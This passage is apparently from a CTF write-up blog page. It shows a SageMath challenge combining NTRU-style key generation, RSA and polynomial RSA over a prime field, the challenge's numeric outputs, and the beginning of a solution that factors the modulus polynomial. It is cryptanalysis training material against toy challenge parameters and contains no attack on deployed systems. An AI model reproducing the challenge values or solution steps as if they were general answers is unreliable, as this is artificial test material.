class="line">from Crypto.Util.number import *</span><br><span class="line">from gmpy2 import *</span><br><span class="line">from secret import flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def gen():</span><br><span class="line">    p1 = getPrime(256)</span><br><span class="line">    while True:</span><br><span class="line">        f = getRandomRange(1, iroot(p1 // 2, 2)[0])</span><br><span class="line">        g = getRandomRange(iroot(p1 // 4, 2)[0], iroot(p1 // 2, 2)[0])</span><br><span class="line">        if gcd(f, p1) == 1 and gcd(f, g) == 1 and isPrime(g) == 1:</span><br><span class="line">            break</span><br><span class="line">    rand = getRandomRange(0, 2 ^ 20)</span><br><span class="line">    g1 = g ^^ rand</span><br><span class="line">    h = (inverse(f, p1) * g1) % p1</span><br><span class="line">    return h, p1, g, f, g1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def gen_irreducable_poly(deg):</span><br><span class="line">    while True:</span><br><span class="line">        out = R.random_element(degree=deg)</span><br><span class="line">        if out.is_irreducible():</span><br><span class="line">            return out</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">h, p1, g, f, g1 = gen()</span><br><span class="line">q = getPrime(1024)</span><br><span class="line">n = g * q </span><br><span class="line">e = 0x10001</span><br><span class="line">c1 = pow(bytes_to_long(flag), e, n)</span><br><span class="line">hint = list(str(h))</span><br><span class="line">length = len(hint)</span><br><span class="line">bits = 16</span><br><span class="line">p2 = random_prime(2 ^ bits - 1, False, 2 ^ (bits - 1))</span><br><span class="line">R.&lt;x&gt; = PolynomialRing(GF(p2))</span><br><span class="line">P = gen_irreducable_poly(ZZ.random_element(length, 2 * length))</span><br><span class="line">Q = gen_irreducable_poly(ZZ.random_element(length, 2 * length))</span><br><span class="line">N = P * Q</span><br><span class="line">S.&lt;x&gt; = R.quotient(N)</span><br><span class="line">m = S(hint)</span><br><span class="line">c2 = m ^ e</span><br><span class="line">print("p1 =", p1)</span><br><span class="line">print("c1 =", c1)</span><br><span class="line">print("p2 =", p2)</span><br><span class="line">print("c2 =", c2)</span><br><span class="line">print("n =", n)</span><br><span class="line">print("N =", N)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">'''</span><br><span class="line">p1 = 106472061241112922861460644342336453303928202010237284715354717630502168520267</span><br><span class="line">c1 = 20920247107738496784071050239422540936224577122721266141057957551603705972966457203177812404896852110975768315464852962210648535130235298413611598658659777108920014929632531307409885868941842921815735008981335582297975794108016151210394446009890312043259167806981442425505200141283138318269058818777636637375101005540308736021976559495266332357714</span><br><span class="line">p2 = 64621</span><br><span class="line">c2 = 19921*x^174 + 49192*x^173 + 18894*x^172 + 61121*x^171 + 50271*x^170 + 11860*x^169 + 53128*x^168 + 38658*x^167 + 14191*x^166 + 9671*x^165 + 40879*x^164 + 15187*x^163 + 33523*x^162 + 62270*x^161 + 64211*x^160 + 54518*x^159 + 50446*x^158 + 2597*x^157 + 32216*x^156 + 10500*x^155 + 63276*x^154 + 27916*x^153 + 55316*x^152 + 30898*x^151 + 43706*x^150 + 5734*x^149 + 35616*x^148 + 14288*x^147 + 18282*x^146 + 22788*x^145 + 48188*x^144 + 34176*x^143 + 55952*x^142 + 9578*x^141 + 9177*x^140 + 22083*x^139 + 14586*x^138 + 9748*x^137 + 21118*x^136 + 155*x^135 + 64224*x^134 + 18193*x^133 + 33732*x^132 + 38135*x^131 + 51992*x^130 + 8203*x^129 + 8538*x^128 + 55203*x^127 + 5003*x^126 + 2009*x^125 + 45023*x^124 + 12311*x^123 + 21428*x^122 + 24110*x^121 + 43537*x^120 + 21885*x^119 + 50212*x^118 + 40445*x^117 + 17768*x^116 + 46616*x^115 + 4771*x^114 + 20903*x^113 + 47764*x^112 + 13056*x^111 + 50837*x^110 + 22313*x^109 + 39698*x^108 + 60377*x^107 + 59357*x^106 + 24051*x^105 + 5888*x^104 + 29414*x^103 + 31726*x^102 + 4906*x^101 + 23968*x^100 + 52360*x^99 + 58063*x^98 + 706*x^97 + 31420*x^96 + 62468*x^95 + 18557*x^94 + 1498*x^93 + 17590*x^92 + 62990*x^91 + 27200*x^90 + 7052*x^89 + 39117*x^88 + 46944*x^87 + 45535*x^86 + 28092*x^85 + 1981*x^84 + 4377*x^83 + 34419*x^82 + 33754*x^81 + 2640*x^80 + 44427*x^79 + 32179*x^78 + 57721*x^77 + 9444*x^76 + 49374*x^75 + 21288*x^74 + 44098*x^73 + 57744*x^72 + 63457*x^71 + 43300*x^70 + 1508*x^69 + 13775*x^68 + 23197*x^67 + 43070*x^66 + 20751*x^65 + 47479*x^64 + 18496*x^63 + 53392*x^62 + 10387*x^61 + 2317*x^60 + 57492*x^59 + 25441*x^58 + 52532*x^57 + 27150*x^56 + 33788*x^55 + 43371*x^54 + 30972*x^53 + 39583*x^52 + 36407*x^51 + 35564*x^50 + 44564*x^49 + 1505*x^48 + 47519*x^47 + 38695*x^46 + 43107*x^45 + 1676*x^44 + 42057*x^43 + 49879*x^42 + 29083*x^41 + 42241*x^40 + 8853*x^39 + 33546*x^38 + 48954*x^37 + 30352*x^36 + 62020*x^35 + 39864*x^34 + 9519*x^33 + 24828*x^32 + 34696*x^31 + 2387*x^30 + 27413*x^29 + 55829*x^28 + 40217*x^27 + 30205*x^26 + 42328*x^25 + 6210*x^24 + 52442*x^23 + 58495*x^22 + 2014*x^21 + 26452*x^20 + 33547*x^19 + 19840*x^18 + 5995*x^17 + 16850*x^16 + 37855*x^15 + 7221*x^14 + 32200*x^13 + 8121*x^12 + 23767*x^11 + 46563*x^10 + 51673*x^9 + 19372*x^8 + 4157*x^7 + 48421*x^6 + 41096*x^5 + 45735*x^4 + 53022*x^3 + 35475*x^2 + 47521*x + 27544</span><br><span class="line">n = 31398174203566229210665534094126601315683074641013205440476552584312112883638278390105806127975406224783128340041129316782549009811196493319665336016690985557862367551545487842904828051293613836275987595871004601968935866634955528775536847402581734910742403788941725304146192149165731194199024154454952157531068881114411265538547462017207361362857</span><br><span class="line">N = 25081*x^175 + 8744*x^174 + 9823*x^173 + 9037*x^172 + 6343*x^171 + 42205*x^170 + 28573*x^169 + 55714*x^168 + 17287*x^167 + 11229*x^166 + 42630*x^165 + 64363*x^164 + 50759*x^163 + 3368*x^162 + 20900*x^161 + 55947*x^160 + 7082*x^159 + 23171*x^158 + 48510*x^157 + 20013*x^156 + 16798*x^155 + 60438*x^154 + 58779*x^153 + 9289*x^152 + 10623*x^151 + 1085*x^150 + 23473*x^149 + 13795*x^148 + 2071*x^147 + 31515*x^146 + 42832*x^145 + 38152*x^144 + 37559*x^143 + 47653*x^142 + 37371*x^141 + 39128*x^140 + 48750*x^139 + 16638*x^138 + 60320*x^137 + 56224*x^136 + 41870*x^135 + 63961*x^134 + 47574*x^133 + 63954*x^132 + 9668*x^131 + 62360*x^130 + 15244*x^129 + 20599*x^128 + 28704*x^127 + 26857*x^126 + 34885*x^125 + 33107*x^124 + 17693*x^123 + 52753*x^122 + 60744*x^121 + 21305*x^120 + 63785*x^119 + 54400*x^118 + 17812*x^117 + 64549*x^116 + 20035*x^115 + 37567*x^114 + 38607*x^113 + 32783*x^112 + 24385*x^111 + 5387*x^110 + 5134*x^109 + 45893*x^108 + 58307*x^107 + 33821*x^106 + 54902*x^105 + 14236*x^104 + 58044*x^103 + 41257*x^102 + 46881*x^101 + 42834*x^100 + 1693*x^99 + 46058*x^98 + 15636*x^97 + 27111*x^96 + 3158*x^95 + 41012*x^94 + 26028*x^93 + 3576*x^92 + 37958*x^91 + 33273*x^90 + 60228*x^89 + 41229*x^88 + 11232*x^87 + 12635*x^86 + 17942*x^85 + 4*x^84 + 25397*x^83 + 63526*x^82 + 54872*x^81 + 40318*x^80 + 37498*x^79 + 52182*x^78 + 48817*x^77 + 10763*x^76 + 46542*x^75 + 36060*x^74 + 49972*x^73 + 63603*x^72 + 46506*x^71 + 44788*x^70 + 44905*x^69 + 46112*x^68 + 5297*x^67 + 26440*x^66 + 28470*x^65 + 15525*x^64 + 11566*x^63 + 15781*x^62 + 36098*x^61 + 44402*x^60 + 55331*x^59 + 61583*x^58 + 16406*x^57 + 59089*x^56 + 53161*x^55 + 43695*x^54 + 49580*x^53 + 62685*x^52 + 31447*x^51 + 26755*x^50 + 14810*x^49 + 3281*x^48 + 27371*x^47 + 53392*x^46 + 2648*x^45 + 10095*x^44 + 25977*x^43 + 22912*x^42 + 41278*x^41 + 33236*x^40 + 57792*x^39 + 7169*x^38 + 29250*x^37 + 16906*x^36 + 4436*x^35 + 2729*x^34 + 29736*x^33 + 19383*x^32 + 11921*x^31 + 26075*x^30 + 54616*x^29 + 739*x^28 + 38509*x^27 + 19118*x^26 + 20062*x^25 + 21280*x^24 + 12594*x^23 + 14974*x^22 + 27795*x^21 + 54107*x^20 + 1890*x^19 + 13410*x^18 + 5381*x^17 + 19500*x^16 + 47481*x^15 + 58488*x^14 + 26433*x^13 + 37803*x^12 + 60232*x^11 + 34772*x^10 + 1505*x^9 + 63760*x^8 + 20890*x^7 + 41533*x^6 + 16130*x^5 + 29769*x^4 + 49142*x^3 + 64184*x^2 + 55443*x + 45925</span><br><span class="line">'''</span><br></pre></td></tr></table></figure><h4><span id="题解">题解</span></h4><ul><li><p><a href="https://xz.aliyun.com/t/7163">从一道CTF题初探NTRU格密码</a></p><p><strong>exp : sage-jupyter</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">R.&lt;x&gt; = PolynomialRing(GF(<span class="number">64621</span>))</span><br><span class="line">N = R(<span class="number">25081</span>*x^<span class="number">175</span> + <span class="number">8744</span>*x^<span class="number">174</span> + <span class="number">9823</span>*x^<span class="number">173</span> + <span class="number">9037</span>*x^<span class="number">172</span> + <span class="number">6343</span>*x^<span class="number">171</span> + <span class="number">42205</span>*x^<span class="number">170</span> + <span class="number">28573</span>*x^<span class="number">169</span> + <span class="number">55714</span>*x^<span class="number">168</span> + <span class="number">17287</span>*x^<span class="number">167</span> + <span class="number">11229</span>*x^<span class="number">166</span> + <span class="number">42630</span>*x^<span class="number">165</span> + <span class="number">64363</span>*x^<span class="number">164</span> + <span class="number">50759</span>*x^<span class="number">163</span> + <span class="number">3368</span>*x^<span class="number">162</span> + <span class="number">20900</span>*x^<span class="number">161</span> + <span class="number">55947</span>*x^<span class="number">160</span> + <span class="number">7082</span>*x^<span class="number">159</span> + <span class="number">23171</span>*x^<span class="number">158</span> + <span class="number">48510</span>*x^<span class="number">157</span> + <span class="number">20013</span>*x^<span class="number">156</span> + <span class="number">16798</span>*x^<span class="number">155</span> + <span class="number">60438</span>*x^<span class="number">154</span> + <span class="number">58779</span>*x^<span class="number">153</span> + <span class="number">9289</span>*x^<span class="number">152</span> + <span class="number">10623</span>*x^<span class="number">151</span> + <span class="number">1085</span>*x^<span class="number">150</span> + <span class="number">23473</span>*x^<span class="number">149</span> + <span class="number">13795</span>*x^<span class="number">148</span> + <span class="number">2071</span>*x^<span class="number">147</span> + <span class="number">31515</span>*x^<span class="number">146</span> + <span class="number">42832</span>*x^<span class="number">145</span> + <span class="number">38152</span>*x^<span class="number">144</span> + <span class="number">37559</span>*x^<span class="number">143</span> + <span class="number">47653</span>*x^<span class="number">142</span> + <span class="number">37371</span>*x^<span class="number">141</span> + <span class="number">39128</span>*x^<span class="number">140</span> + <span class="number">48750</span>*x^<span class="number">139</span> + <span class="number">16638</span>*x^<span class="number">138</span> + <span class="number">60320</span>*x^<span class="number">137</span> + <span class="number">56224</span>*x^<span class="number">136</span> + <span class="number">41870</span>*x^<span class="number">135</span> + <span class="number">63961</span>*x^<span class="number">134</span> + <span class="number">47574</span>*x^<span class="number">133</span> + <span class="number">63954</span>*x^<span class="number">132</span> + <span class="number">9668</span>*x^<span class="number">131</span> + <span class="number">62360</span>*x^<span class="number">130</span> + <span class="number">15244</span>*x^<span class="number">129</span> + <span class="number">20599</span>*x^<span class="number">128</span> + <span class="number">28704</span>*x^<span class="number">127</span> + <span class="number">26857</span>*x^<span class="number">126</span> + <span class="number">34885</span>*x^<span class="number">125</span> + <span class="number">33107</span>*x^<span class="number">124</span> + <span class="number">17693</span>*x^<span class="number">123</span> + <span class="number">52753</span>*x^<span class="number">122</span> + <span class="number">60744</span>*x^<span class="number">121</span> + <span class="number">21305</span>*x^<span class="number">120</span> + <span class="number">63785</span>*x^<span class="number">119</span> + <span class="number">54400</span>*x^<span class="number">118</span> + <span class="number">17812</span>*x^<span class="number">117</span> + <span class="number">64549</span>*x^<span class="number">116</span> + <span class="number">20035</span>*x^<span class="number">115</span> + <span class="number">37567</span>*x^<span class="number">114</span> + <span class="number">38607</span>*x^<span class="number">113</span> + <span class="number">32783</span>*x^<span class="number">112</span> + <span class="number">24385</span>*x^<span class="number">111</span> + <span class="number">5387</span>*x^<span class="number">110</span> + <span class="number">5134</span>*x^<span class="number">109</span> + <span class="number">45893</span>*x^<span class="number">108</span> + <span class="number">58307</span>*x^<span class="number">107</span> + <span class="number">33821</span>*x^<span class="number">106</span> + <span class="number">54902</span>*x^<span class="number">105</span> + <span class="number">14236</span>*x^<span class="number">104</span> + <span class="number">58044</span>*x^<span class="number">103</span> + <span class="number">41257</span>*x^<span class="number">102</span> + <span class="number">46881</span>*x^<span class="number">101</span> + <span class="number">42834</span>*x^<span class="number">100</span> + <span class="number">1693</span>*x^<span class="number">99</span> + <span class="number">46058</span>*x^<span class="number">98</span> + <span class="number">15636</span>*x^<span class="number">97</span> + <span class="number">27111</span>*x^<span class="number">96</span> + <span class="number">3158</span>*x^<span class="number">95</span> + <span class="number">41012</span>*x^<span class="number">94</span> + <span class="number">26028</span>*x^<span class="number">93</span> + <span class="number">3576</span>*x^<span class="number">92</span> + <span class="number">37958</span>*x^<span class="number">91</span> + <span class="number">33273</span>*x^<span class="number">90</span> + <span class="number">60228</span>*x^<span class="number">89</span> + <span class="number">41229</span>*x^<span class="number">88</span> + <span class="number">11232</span>*x^<span class="number">87</span> + <span class="number">12635</span>*x^<span class="number">86</span> + <span class="number">17942</span>*x^<span class="number">85</span> + <span class="number">4</span>*x^<span class="number">84</span> + <span class="number">25397</span>*x^<span class="number">83</span> + <span class="number">63526</span>*x^<span class="number">82</span> + <span class="number">54872</span>*x^<span class="number">81</span> + <span class="number">40318</span>*x^<span class="number">80</span> + <span class="number">37498</span>*x^<span class="number">79</span> + <span class="number">52182</span>*x^<span class="number">78</span> + <span class="number">48817</span>*x^<span class="number">77</span> + <span class="number">10763</span>*x^<span class="number">76</span> + <span class="number">46542</span>*x^<span class="number">75</span> + <span class="number">36060</span>*x^<span class="number">74</span> + <span class="number">49972</span>*x^<span class="number">73</span> + <span class="number">63603</span>*x^<span class="number">72</span> + <span class="number">46506</span>*x^<span class="number">71</span> + <span class="number">44788</span>*x^<span class="number">70</span> + <span class="number">44905</span>*x^<span class="number">69</span> + <span class="number">46112</span>*x^<span class="number">68</span> + <span class="number">5297</span>*x^<span class="number">67</span> + <span class="number">26440</span>*x^<span class="number">66</span> + <span class="number">28470</span>*x^<span class="number">65</span> + <span class="number">15525</span>*x^<span class="number">64</span> + <span class="number">11566</span>*x^<span class="number">63</span> + <span class="number">15781</span>*x^<span class="number">62</span> + <span class="number">36098</span>*x^<span class="number">61</span> + <span class="number">44402</span>*x^<span class="number">60</span> + <span class="number">55331</span>*x^<span class="number">59</span> + <span class="number">61583</span>*x^<span class="number">58</span> + <span class="number">16406</span>*x^<span class="number">57</span> + <span class="number">59089</span>*x^<span class="number">56</span> + <span class="number">53161</span>*x^<span class="number">55</span> + <span class="number">43695</span>*x^<span class="number">54</span> + <span class="number">49580</span>*x^<span class="number">53</span> + <span class="number">62685</span>*x^<span class="number">52</span> + <span class="number">31447</span>*x^<span class="number">51</span> + <span class="number">26755</span>*x^<span class="number">50</span> + <span class="number">14810</span>*x^<span class="number">49</span> + <span class="number">3281</span>*x^<span class="number">48</span> + <span class="number">27371</span>*x^<span class="number">47</span> + <span class="number">53392</span>*x^<span class="number">46</span> + <span class="number">2648</span>*x^<span class="number">45</span> + <span class="number">10095</span>*x^<span class="number">44</span> + <span class="number">25977</span>*x^<span class="number">43</span> + <span class="number">22912</span>*x^<span class="number">42</span> + <span class="number">41278</span>*x^<span class="number">41</span> + <span class="number">33236</span>*x^<span class="number">40</span> + <span class="number">57792</span>*x^<span class="number">39</span> + <span class="number">7169</span>*x^<span class="number">38</span> + <span class="number">29250</span>*x^<span class="number">37</span> + <span class="number">16906</span>*x^<span class="number">36</span> + <span class="number">4436</span>*x^<span class="number">35</span> + <span class="number">2729</span>*x^<span class="number">34</span> + <span class="number">29736</span>*x^<span class="number">33</span> + <span class="number">19383</span>*x^<span class="number">32</span> + <span class="number">11921</span>*x^<span class="number">31</span> + <span class="number">26075</span>*x^<span class="number">30</span> + <span class="number">54616</span>*x^<span class="number">29</span> + <span class="number">739</span>*x^<span class="number">28</span> + <span class="number">38509</span>*x^<span class="number">27</span> + <span class="number">19118</span>*x^<span class="number">26</span> + <span class="number">20062</span>*x^<span class="number">25</span> + <span class="number">21280</span>*x^<span class="number">24</span> + <span class="number">12594</span>*x^<span class="number">23</span> + <span class="number">14974</span>*x^<span class="number">22</span> + <span class="number">27795</span>*x^<span class="number">21</span> + <span class="number">54107</span>*x^<span class="number">20</span> + <span class="number">1890</span>*x^<span class="number">19</span> + <span class="number">13410</span>*x^<span class="number">18</span> + <span class="number">5381</span>*x^<span class="number">17</span> + <span class="number">19500</span>*x^<span class="number">16</span> + <span class="number">47481</span>*x^<span class="number">15</span> + <span class="number">58488</span>*x^<span class="number">14</span> + <span class="number">26433</span>*x^<span class="number">13</span> + <span class="number">37803</span>*x^<span class="number">12</span> + <span class="number">60232</span>*x^<span class="number">11</span> + <span class="number">34772</span>*x^<span class="number">10</span> + <span class="number">1505</span>*x^<span class="number">9</span> + <span class="number">63760</span>*x^<span class="number">8</span> + <span class="number">20890</span>*x^<span class="number">7</span> + <span class="number">41533</span>*x^<span class="number">6</span> + <span class="number">16130</span>*x^<span class="number">5</span> + <span class="number">29769</span>*x^<span class="number">4</span> + <span class="number">49142</span>*x^<span class="number">3</span> + <span class="number">64184</span>*x^<span class="number">2</span> + <span class="number">55443</span>*x + <span class="number">45925</span>)</span><br><span class="line">c2 = R(<span class="number">19921</span>*x^<span class="number">174</span> + <span class="number">49192</span>*x^<span class="number">173</span> + <span class="number">18894</span>*x^<span class="number">172</span> + <span class="number">61121</span>*x^<span class="number">171</span> + <span class="number">50271</span>*x^<span class="number">170</span> + <span class="number">11860</span>*x^<span class="number">169</span> + <span class="number">53128</span>*x^<span class="number">168</span> + <span class="number">38658</span>*x^<span class="number">167</span> + <span class="number">14191</span>*x^<span class="number">166</span> + <span class="number">9671</span>*x^<span class="number">165</span> + <span class="number">40879</span>*x^<span class="number">164</span> + <span class="number">15187</span>*x^<span class="number">163</span> + <span class="number">33523</span>*x^<span class="number">162</span> + <span class="number">62270</span>*x^<span class="number">161</span> + <span class="number">64211</span>*x^<span class="number">160</span> + <span class="number">54518</span>*x^<span class="number">159</span> + <span class="number">50446</span>*x^<span class="number">158</span> + <span class="number">2597</span>*x^<span class="number">157</span> + <span class="number">32216</span>*x^<span class="number">156</span> + <span class="number">10500</span>*x^<span class="number">155</span> + <span class="number">63276</span>*x^<span class="number">154</span> + <span class="number">27916</span>*x^<span class="number">153</span> + <span class="number">55316</span>*x^<span class="number">152</span> + <span class="number">30898</span>*x^<span class="number">151</span> + <span class="number">43706</span>*x^<span class="number">150</span> + <span class="number">5734</span>*x^<span class="number">149</span> + <span class="number">35616</span>*x^<span class="number">148</span> + <span class="number">14288</span>*x^<span class="number">147</span> + <span class="number">18282</span>*x^<span class="number">146</span> + <span class="number">22788</span>*x^<span class="number">145</span> + <span class="number">48188</span>*x^<span class="number">144</span> + <span class="number">34176</span>*x^<span class="number">143</span> + <span class="number">55952</span>*x^<span class="number">142</span> + <span class="number">9578</span>*x^<span class="number">141</span> + <span class="number">9177</span>*x^<span class="number">140</span> + <span class="number">22083</span>*x^<span class="number">139</span> + <span class="number">14586</span>*x^<span class="number">138</span> + <span class="number">9748</span>*x^<span class="number">137</span> + <span class="number">21118</span>*x^<span class="number">136</span> + <span class="number">155</span>*x^<span class="number">135</span> + <span class="number">64224</span>*x^<span class="number">134</span> + <span class="number">18193</span>*x^<span class="number">133</span> + <span class="number">33732</span>*x^<span class="number">132</span> + <span class="number">38135</span>*x^<span class="number">131</span> + <span class="number">51992</span>*x^<span class="number">130</span> + <span class="number">8203</span>*x^<span class="number">129</span> + <span class="number">8538</span>*x^<span class="number">128</span> + <span class="number">55203</span>*x^<span class="number">127</span> + <span class="number">5003</span>*x^<span class="number">126</span> + <span class="number">2009</span>*x^<span class="number">125</span> + <span class="number">45023</span>*x^<span class="number">124</span> + <span class="number">12311</span>*x^<span class="number">123</span> + <span class="number">21428</span>*x^<span class="number">122</span> + <span class="number">24110</span>*x^<span class="number">121</span> + <span class="number">43537</span>*x^<span class="number">120</span> + <span class="number">21885</span>*x^<span class="number">119</span> + <span class="number">50212</span>*x^<span class="number">118</span> + <span class="number">40445</span>*x^<span class="number">117</span> + <span class="number">17768</span>*x^<span class="number">116</span> + <span class="number">46616</span>*x^<span class="number">115</span> + <span class="number">4771</span>*x^<span class="number">114</span> + <span class="number">20903</span>*x^<span class="number">113</span> + <span class="number">47764</span>*x^<span class="number">112</span> + <span class="number">13056</span>*x^<span class="number">111</span> + <span class="number">50837</span>*x^<span class="number">110</span> + <span class="number">22313</span>*x^<span class="number">109</span> + <span class="number">39698</span>*x^<span class="number">108</span> + <span class="number">60377</span>*x^<span class="number">107</span> + <span class="number">59357</span>*x^<span class="number">106</span> + <span class="number">24051</span>*x^<span class="number">105</span> + <span class="number">5888</span>*x^<span class="number">104</span> + <span class="number">29414</span>*x^<span class="number">103</span> + <span class="number">31726</span>*x^<span class="number">102</span> + <span class="number">4906</span>*x^<span class="number">101</span> + <span class="number">23968</span>*x^<span class="number">100</span> + <span class="number">52360</span>*x^<span class="number">99</span> + <span class="number">58063</span>*x^<span class="number">98</span> + <span class="number">706</span>*x^<span class="number">97</span> + <span class="number">31420</span>*x^<span class="number">96</span> + <span class="number">62468</span>*x^<span class="number">95</span> + <span class="number">18557</span>*x^<span class="number">94</span> + <span class="number">1498</span>*x^<span class="number">93</span> + <span class="number">17590</span>*x^<span class="number">92</span> + <span class="number">62990</span>*x^<span class="number">91</span> + <span class="number">27200</span>*x^<span class="number">90</span> + <span class="number">7052</span>*x^<span class="number">89</span> + <span class="number">39117</span>*x^<span class="number">88</span> + <span class="number">46944</span>*x^<span class="number">87</span> + <span class="number">45535</span>*x^<span class="number">86</span> + <span class="number">28092</span>*x^<span class="number">85</span> + <span class="number">1981</span>*x^<span class="number">84</span> + <span class="number">4377</span>*x^<span class="number">83</span> + <span class="number">34419</span>*x^<span class="number">82</span> + <span class="number">33754</span>*x^<span class="number">81</span> + <span class="number">2640</span>*x^<span class="number">80</span> + <span class="number">44427</span>*x^<span class="number">79</span> + <span class="number">32179</span>*x^<span class="number">78</span> + <span class="number">57721</span>*x^<span class="number">77</span> + <span class="number">9444</span>*x^<span class="number">76</span> + <span class="number">49374</span>*x^<span class="number">75</span> + <span class="number">21288</span>*x^<span class="number">74</span> + <span class="number">44098</span>*x^<span class="number">73</span> + <span class="number">57744</span>*x^<span class="number">72</span> + <span class="number">63457</span>*x^<span class="number">71</span> + <span class="number">43300</span>*x^<span class="number">70</span> + <span class="number">1508</span>*x^<span class="number">69</span> + <span class="number">13775</span>*x^<span class="number">68</span> + <span class="number">23197</span>*x^<span class="number">67</span> + <span class="number">43070</span>*x^<span class="number">66</span> + <span class="number">20751</span>*x^<span class="number">65</span> + <span class="number">47479</span>*x^<span class="number">64</span> + <span class="number">18496</span>*x^<span class="number">63</span> + <span class="number">53392</span>*x^<span class="number">62</span> + <span class="number">10387</span>*x^<span class="number">61</span> + <span class="number">2317</span>*x^<span class="number">60</span> + <span class="number">57492</span>*x^<span class="number">59</span> + <span class="number">25441</span>*x^<span class="number">58</span> + <span class="number">52532</span>*x^<span class="number">57</span> + <span class="number">27150</span>*x^<span class="number">56</span> + <span class="number">33788</span>*x^<span class="number">55</span> + <span class="number">43371</span>*x^<span class="number">54</span> + <span class="number">30972</span>*x^<span class="number">53</span> + <span class="number">39583</span>*x^<span class="number">52</span> + <span class="number">36407</span>*x^<span class="number">51</span> + <span class="number">35564</span>*x^<span class="number">50</span> + <span class="number">44564</span>*x^<span class="number">49</span> + <span class="number">1505</span>*x^<span class="number">48</span> + <span class="number">47519</span>*x^<span class="number">47</span> + <span class="number">38695</span>*x^<span class="number">46</span> + <span class="number">43107</span>*x^<span class="number">45</span> + <span class="number">1676</span>*x^<span class="number">44</span> + <span class="number">42057</span>*x^<span class="number">43</span> + <span class="number">49879</span>*x^<span class="number">42</span> + <span class="number">29083</span>*x^<span class="number">41</span> + <span class="number">42241</span>*x^<span class="number">40</span> + <span class="number">8853</span>*x^<span class="number">39</span> + <span class="number">33546</span>*x^<span class="number">38</span> + <span class="number">48954</span>*x^<span class="number">37</span> + <span class="number">30352</span>*x^<span class="number">36</span> + <span class="number">62020</span>*x^<span class="number">35</span> + <span class="number">39864</span>*x^<span class="number">34</span> + <span class="number">9519</span>*x^<span class="number">33</span> + <span class="number">24828</span>*x^<span class="number">32</span> + <span class="number">34696</span>*x^<span class="number">31</span> + <span class="number">2387</span>*x^<span class="number">30</span> + <span class="number">27413</span>*x^<span class="number">29</span> + <span class="number">55829</span>*x^<span class="number">28</span> + <span class="number">40217</span>*x^<span class="number">27</span> + <span class="number">30205</span>*x^<span class="number">26</span> + <span class="number">42328</span>*x^<span class="number">25</span> + <span class="number">6210</span>*x^<span class="number">24</span> + <span class="number">52442</span>*x^<span class="number">23</span> + <span class="number">58495</span>*x^<span class="number">22</span> + <span class="number">2014</span>*x^<span class="number">21</span> + <span class="number">26452</span>*x^<span class="number">20</span> + <span class="number">33547</span>*x^<span class="number">19</span> + <span class="number">19840</span>*x^<span class="number">18</span> + <span class="number">5995</span>*x^<span class="number">17</span> + <span class="number">16850</span>*x^<span class="number">16</span> + <span class="number">37855</span>*x^<span class="number">15</span> + <span class="number">7221</span>*x^<span class="number">14</span> + <span class="number">32200</span>*x^<span class="number">13</span> + <span class="number">8121</span>*x^<span class="number">12</span> + <span class="number">23767</span>*x^<span class="number">11</span> + <span class="number">46563</span>*x^<span class="number">10</span> + <span class="number">51673</span>*x^<span class="number">9</span> + <span class="number">19372</span>*x^<span class="number">8</span> + <span class="number">4157</span>*x^<span class="number">7</span> + <span class="number">48421</span>*x^<span class="number">6</span> + <span class="number">41096</span>*x^<span class="number">5</span> + <span class="number">45735</span>*x^<span class="number">4</span> + <span class="number">53022</span>*x^<span class="number">3</span> + <span class="number">35475</span>*x^<span class="number">2</span> + <span class="number">47521</span>*x + <span class="number">27544</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">N.factor()[<span class="number">0</span>]</span><br><span class="line"><span class="comment">#(x^78 + 12426*x^77 + 29706*x^76 + 14214*x^75 + 41435*x^74 + 46604*x^73 + 23893*x^72 + 10411*x^71 + 55449*x^70 + 15218*x^69 + 42907*x^68 + 47641*x^67 + 31448*x^66 + 52209*x^65 + 43302*x^64 + 16480*x^63 + 60790*x^62 + 5440*x^61 + 7131*x^60 + 47643*x^59 + 12616*x^58 + 9600*x^57 + 33867*x^56 + 59837*x^55 + 33851*x^54 + 51809*x^53 + 12147*x^52 + 50975*x^51 + 2080*x^50 + 52706*x^49 + 30987*x^48 + 42329*x^47 + 7882*x^46 + 19787*x^45 + 46963*x^44 + 4443*x^43 + 28880*x^42 + 47493*x^41 + 46039*x^40 + 51625*x^39 + 1202*x^38 + 40015*x^37 + 48373*x^36 + 28521*x^35 + 7510*x^34 + 42677*x^33 + 18248*x^32 + 19314*x^31 + 46253*x^30 + 25572*x^29 + 16620*x^28 + 40310*x^27 + 4300*x^26 + 2195*x^25 + 23169*x^24 + 16251*x^23 + 38607*x^22 + 61403*x^21 + 30009*x^20 + 46356*x^19 + 24409*x^18 + 36007*x^17 + 7388*x^16 + 62589*x^15 + 34443*x^14 + 20261*x^13 + 14591*x^12 + 21291*x^11 + 47993*x^10 + 19889*x^9 + 24951*x^8 + 38667*x^7 + 8751*x^6 + 12468*x^5 + 4382*x^4 + 50198*x^3 + 58586*x^2 + 54642*x + 36759,1)</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">N.factor()[<span class="number">1</span>]</span><br><span class="line"><span class="comment">#(x^97 + 24614*x^96 + 57423*x^95 + 10374*x^94 + 55372*x^93 + 2939*x^92 + 56646*x^91 + 36469*x^90 + 19757*x^89 + 49884*x^88 + 41822*x^87 + 59735*x^86 + 28106*x^85 + 18673*x^84 + 39902*x^83 + 41200*x^82 + 49062*x^81 + 6220*x^80 + 22316*x^79 + 4705*x^78 + 48905*x^77 + 21240*x^76 + 50990*x^75 + 13677*x^74 + 50609*x^73 + 55229*x^72 + 61202*x^71 + 58779*x^70 + 11596*x^69 + 51148*x^68 + 22032*x^67 + 63045*x^66 + 25960*x^65 + 9533*x^64 + 35971*x^63 + 21688*x^62 + 19214*x^61 + 50614*x^60 + 4436*x^59 + 63337*x^58 + 32836*x^57 + 37300*x^56 + 22892*x^55 + 22379*x^54 + 5275*x^53 + 44347*x^52 + 61522*x^51 + 34072*x^50 + 15591*x^49 + 22103*x^48 + 53112*x^47 + 20452*x^46 + 5723*x^45 + 23865*x^44 + 52363*x^43 + 36307*x^42 + 20419*x^41 + 46717*x^40 + 